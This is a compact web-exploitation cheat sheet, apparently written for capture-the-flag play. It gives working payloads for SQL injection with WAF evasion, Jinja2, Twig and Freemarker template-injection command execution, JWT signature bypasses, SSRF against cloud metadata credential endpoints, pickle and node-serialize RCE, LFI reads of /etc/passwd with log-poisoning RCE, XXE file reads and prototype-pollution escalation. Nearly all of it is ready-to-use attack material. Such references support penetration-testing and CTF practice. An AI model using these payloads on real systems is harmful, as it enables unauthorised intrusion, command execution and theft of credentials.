# web

Enumerate before exploiting. The vulnerability is usually in the parameter nobody documented.

## Recon

```bash
ffuf -u https://t/ FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc all -fs 0
nikto -host https://t
whatweb https://t
```

Read the source if it ships. Grep for `eval`, `include`, `unserialize`, `child_process`, `render_template_string`,
`jwt.decode`, `pickle.loads`.

## SQL injection

Probe: `'`, `"`, `')`, `1 AND 1=1`, `1 AND 1=2`, arithmetic `2-1` vs `2`.

```sql
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```

Blind: boolean with `SUBSTR`, or time with `SLEEP(2)` / `pg_sleep(2)`. `sqlmap -r req.txt --batch --level 5`
once the injection point is confirmed, not before.

WAF in the way: inline comments `/**/`, case mixing `UnIoN`, `+` vs `%20`, `-- -` vs `#`.

## SSTI

`{{7*7}}` → 49 means Jinja2/Twig. Then:

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen("cat /flag").read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

Filtered underscores: `{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f') }}`.
Twig: `{{["id"]|filter("system")}}`. Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.

## JWT

| Misconfiguration | Attack |
| --- | --- |
| `alg` accepted as `none` | strip the signature, set `{"alg":"none"}` |
| HS256 with the public key available | sign with the PEM as the secret |
| `kid` used in a path | `../../../../dev/null` with an empty secret |
| `jku`/`x5u` unvalidated | host your own JWKS |

`jwt_tool <token> -M at -t https://t/` automates the matrix. Base64url without padding.

## SSRF

Target `169.254.169.254/latest/meta-data/iam/security-credentials/`, `127.0.0.1:PORT`, `[::1]`,
`0x7f000001`, decimal `2130706433`. Redirect to internal with a 302 on your own host. DNS rebinding
if the allowlist is hostname-based. `gopher://` for Redis/SMTP smuggling.

## Deserialization

- Python pickle: craft `__reduce__` returning `(os.system, ("cp /flag /app/static/x",))`.
- PHP: `unserialize` on a POP chain; `phpggc` for framework gadgets.
- Java: ysoserial payloads, watch the exact JDK.
- Node: `node-serialize` `{"rce":"_$$ND_FUNC$$_function(){...}()"}`.

## File inclusion / traversal

`?file=../../../../etc/passwd`, then `php://filter/convert.base64-encode/resource=index.php` to read
source. LFI→RCE via log poisoning (User-Agent into `access.log`), `/proc/self/environ`, or
`php://input` with `allow_url_include`.

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

Blind: external DTD on your host, OOB exfil through a parameter entity.

## Prototype pollution

`?__proto__[isAdmin]=true`, or JSON `{"__proto__":{"isAdmin":true}}`. In Node, escalate to RCE via
`child_process` in a gadget chain (`EJS`, `lodash.merge`).

## Race

Single-packet attack: last-byte sync with `Turbo Intruder`, or `ffuf -t 40` against a coupon/redeem
endpoint. Send N parallel requests where N > the intended limit.
